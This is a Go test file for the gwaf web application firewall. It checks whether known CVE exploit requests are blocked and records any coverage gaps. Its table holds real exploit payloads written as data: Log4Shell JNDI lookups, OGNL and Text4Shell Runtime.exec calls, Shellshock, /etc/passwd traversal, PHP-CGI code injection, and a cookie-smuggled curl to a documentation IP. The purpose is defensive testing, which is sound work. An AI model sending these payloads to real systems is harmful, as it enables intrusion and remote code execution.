// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package gwaf_test

import (
	"flag"
	"fmt"
	"os"
	"sort"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/ruleset/leaks"
	"github.com/gsoultan/gwaf/ruleset/signatures"
)

// The CVE drill answers one question in minutes instead of a review: is a CVE
// that was just published already covered?
//
// Each entry is the request a public exploit sends, reduced to the part that
// carries the attack, and a benign neighbour on the same target that must still
// pass. The drill runs it twice: against core alone, and against core with the
// opt-in bundles an embedder such as gateon loads. That separates the two kinds
// of coverage worth telling apart:
//
//   - structural: core's detectors refuse it without a rule naming the CVE.
//     This is the coverage that also holds for the next CVE of the same shape.
//   - named: only a bundle rule refuses it, typically one written for the CVE.
//   - gap: nothing refuses it, and the note says why and what would.
//   - embedder: the defect is one gwaf's scope line gives to the embedder
//     (a header the edge must strip, a socket, an encrypted protocol), and the
//     note names where it is handled. The request is still run, so an entry
//     that gwaf starts catching is noticed.
//
// Adding a CVE is a table entry. The test fails when an entry's coverage
// changes in either direction, so a regression and a gap that quietly closed
// are both seen, and docs/CVE-COVERAGE.md is regenerated with -update-cve-doc.

var updateCVEDoc = flag.Bool("update-cve-doc", false, "rewrite docs/CVE-COVERAGE.md from the CVE drill")

type coverage string

const (
	covStructural coverage = "structural"
	covNamed      coverage = "named"
	covGap        coverage = "gap"
	covEmbedder   coverage = "embedder"
)

type drillReq struct {
	method, target string
	headers        [][2]string
	ct             string
	body           string
}

type cveCase struct {
	cve, name string
	attack    drillReq
	benign    drillReq
	want      coverage
	note      string
}

var cveDrill = []cveCase{
	{
		cve: "CVE-2021-44228", name: "Log4Shell JNDI lookup in a header",
		attack: drillReq{method: "GET", target: "/", headers: [][2]string{{"X-Api-Version", "${jndi:ldap://203.0.113.7/a}"}}},
		benign: drillReq{method: "GET", target: "/", headers: [][2]string{{"X-Api-Version", "2.17.1"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2021-44228", name: "Log4Shell with nested lookups",
		attack: drillReq{method: "GET", target: "/?q=${${lower:j}${lower:n}di:ldap://203.0.113.7/a}"},
		benign: drillReq{method: "GET", target: "/?q=${user.name}"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-42889", name: "Text4Shell script interpolation",
		attack: drillReq{method: "GET", target: "/?q=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"},
		benign: drillReq{method: "GET", target: "/?q=javascript+tutorial"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-22965", name: "Spring4Shell class loader binding",
		attack: drillReq{method: "POST", target: "/", ct: "application/x-www-form-urlencoded",
			body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"},
		benign: drillReq{method: "POST", target: "/", ct: "application/x-www-form-urlencoded", body: "class=economy&module=3"},
		want:   covStructural,
	},
	{
		cve: "CVE-2014-6271", name: "Shellshock function definition in User-Agent",
		attack: drillReq{method: "GET", target: "/cgi-bin/status", headers: [][2]string{{"User-Agent", "() { :; }; /bin/bash -c 'id'"}}},
		benign: drillReq{method: "GET", target: "/cgi-bin/status", headers: [][2]string{{"User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2017-5638", name: "Struts2 OGNL in Content-Type",
		attack: drillReq{method: "POST", target: "/upload.action",
			headers: [][2]string{{"Content-Type", "%{(#_='multipart/form-data').(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}"}}},
		benign: drillReq{method: "POST", target: "/upload.action", ct: "multipart/form-data; boundary=x", body: "--x--\r\n"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-26134", name: "Confluence OGNL in the path",
		attack: drillReq{method: "GET", target: "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"},
		benign: drillReq{method: "GET", target: "/display/ENG/Runbook"},
		want:   covStructural,
	},
	{
		cve: "CVE-2021-41773", name: "Apache dot-dot traversal to /etc/passwd",
		attack: drillReq{method: "GET", target: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"},
		benign: drillReq{method: "GET", target: "/cgi-bin/status"},
		want:   covStructural,
	},
	{
		cve: "CVE-2019-19781", name: "Citrix ADC traversal to vpns",
		attack: drillReq{method: "GET", target: "/vpn/../vpns/cfg/smb.conf"},
		benign: drillReq{method: "GET", target: "/vpn/index.html"},
		want:   covGap,
		note:   "One ../ that stays inside the tree is ordinary, and nothing marks /vpns/ or smb.conf as sensitive. An embedder that normalises the path forwards /vpns/cfg/smb.conf, which is the target anyway.",
	},
	{
		cve: "CVE-2024-4577", name: "PHP-CGI argument injection with a soft hyphen",
		attack: drillReq{method: "POST", target: "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
			ct: "application/x-www-form-urlencoded", body: "<?php system('id'); ?>"},
		benign: drillReq{method: "GET", target: "/index.php?page=about"},
		want:   covStructural,
	},
	{
		cve: "CVE-2024-3400", name: "PAN-OS command injection in a session cookie",
		attack: drillReq{method: "GET", target: "/global-protect/login.esp",
			headers: [][2]string{{"Cookie", "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aaa`curl${IFS}203.0.113.7`"}}},
		benign: drillReq{method: "GET", target: "/global-protect/login.esp", headers: [][2]string{{"Cookie", "SESSID=7f3c9a1e"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2023-34362", name: "MOVEit Transfer SQL injection header",
		attack: drillReq{method: "POST", target: "/moveitisapi/moveitisapi.dll?action=m2",
			headers: [][2]string{{"X-siLock-Transaction", "folder_add_by_path"}, {"X-siLock-SessVar0", "MyUsername: Guest"}}},
		benign: drillReq{method: "GET", target: "/human.aspx"},
		want:   covGap,
		note:   "signatures.IDMOVEitHeader keys on X-siis-session-id; the session-variable injection the public exploit sends in X-siLock-* headers passes.",
	},
	{
		cve: "CVE-2025-29927", name: "Next.js middleware bypass header",
		attack: drillReq{method: "GET", target: "/admin",
			headers: [][2]string{{"x-middleware-subrequest", "middleware:middleware:middleware:middleware:middleware"}}},
		benign: drillReq{method: "GET", target: "/admin"},
		want:   covEmbedder,
		note:   "The header is harmless text; the defect is a framework trusting it from a client. The edge must strip it (gateon: framework-internal headers are stripped at the entrypoint).",
	},
	{
		cve: "CVE-2026-98432", name: "Kernel TCP handshake use-after-free via SYN IP options",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "Fires before accept(); no request exists. gateon ADR 0083 drops SYNs carrying IP options in XDP/TC.",
	},
	{
		cve: "CVE-2026-123158", name: "OpenSSH long-password bypass",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "Inside the encrypted SSH session; no HTTP request exists. gateon ADR 0084 enforces IP filters on SSH routes.",
	},
}

func drillWAFs(t *testing.T) (core, full *gwaf.WAF) {
	t.Helper()
	core, err := gwaf.New()
	if err != nil {
		t.Fatal(err)
	}
	full, err = gwaf.New(gwaf.WithRuleset(append(signatures.All(), leaks.All()...)))
	if err != nil {
		t.Fatal(err)
	}
	return core, full
}

func drillBlocked(w *gwaf.WAF, r drillReq) bool {
	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRemoteAddr("192.0.2.10")
	tx.SetRequestLine(r.method, r.target, "HTTP/1.1")
	for _, h := range r.headers {
		tx.AddRequestHeader(h[0], h[1])
	}
	if r.ct != "" {
		tx.AddRequestHeader("Content-Type", r.ct)
	}
	if tx.ProcessRequestHeaders().Blocked() {
		return true
	}
	if r.body != "" {
		tx.SetRequestBody([]byte(r.body))
	}
	return tx.ProcessRequestBody().Blocked()
}

func classify(core, full bool) coverage {
	switch {
	case core:
		return covStructural
	case full:
		return covNamed
	default:
		return covGap
	}
}

func TestCVEDrill(t *testing.T) {
	core, full := drillWAFs(t)
	seen := map[string]bool{}
	for _, c := range cveDrill {
		if seen[c.cve+c.name] {
			t.Errorf("%s %q appears twice", c.cve, c.name)
		}
		seen[c.cve+c.name] = true
		got := classify(drillBlocked(core, c.attack), drillBlocked(full, c.attack))
		want := c.want
		if want == covEmbedder {
			if got != covGap {
				t.Errorf("%s (%s): marked embedder but gwaf now refuses it (%s); reclassify", c.cve, c.name, got)
			}
		} else if got != want {
			t.Errorf("%s (%s): coverage is %s, the drill records %s", c.cve, c.name, got, want)
		}
		if (want == covGap || want == covEmbedder) && c.note == "" {
			t.Errorf("%s (%s): a %s entry must say why and where it is handled", c.cve, c.name, want)
		}
		if drillBlocked(full, c.benign) {
			t.Errorf("%s (%s): the benign neighbour is refused", c.cve, c.name)
		}
	}
	doc := renderCVEDoc()
	const path = "docs/CVE-COVERAGE.md"
	if *updateCVEDoc {
		if err := os.WriteFile(path, []byte(doc), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	cur, err := os.ReadFile(path)
	// A Windows checkout rewrites the file's line endings (core.autocrlf), and
	// the comparison is about the table, so the endings are folded first.
	if err != nil || strings.ReplaceAll(string(cur), "\r\n", "\n") != doc {
		t.Errorf("%s is out of date; run go test -run TestCVEDrill -update-cve-doc .", path)
	}
}

func renderCVEDoc() string {
	cases := append([]cveCase(nil), cveDrill...)
	sort.SliceStable(cases, func(i, j int) bool { return cases[i].cve < cases[j].cve })
	counts := map[coverage]int{}
	var b strings.Builder
	b.WriteString("# CVE coverage\n\n")
	b.WriteString("Generated by `TestCVEDrill` (`cve_drill_test.go`). Do not edit by hand:\n")
	b.WriteString("add an entry to the drill and run `go test -run TestCVEDrill -update-cve-doc .`\n\n")
	b.WriteString("- **structural**: core refuses it with no rule naming the CVE, so the next CVE of the same shape is covered too.\n")
	b.WriteString("- **named**: only an opt-in bundle rule (`ruleset/signatures`, `ruleset/leaks`) refuses it.\n")
	b.WriteString("- **gap**: nothing refuses it yet; the note says why.\n")
	b.WriteString("- **embedder**: outside gwaf's scope line (CLAUDE.md §1); the note says where it is handled.\n\n")
	b.WriteString("| CVE | Exploit | Coverage | Note |\n|---|---|---|---|\n")
	for _, c := range cases {
		counts[c.want]++
		fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", c.cve, c.name, c.want, c.note)
	}
	fmt.Fprintf(&b, "\n%d entries: %d structural, %d named, %d gap, %d embedder.\n",
		len(cases), counts[covStructural], counts[covNamed], counts[covGap], counts[covEmbedder])
	return b.String()
}
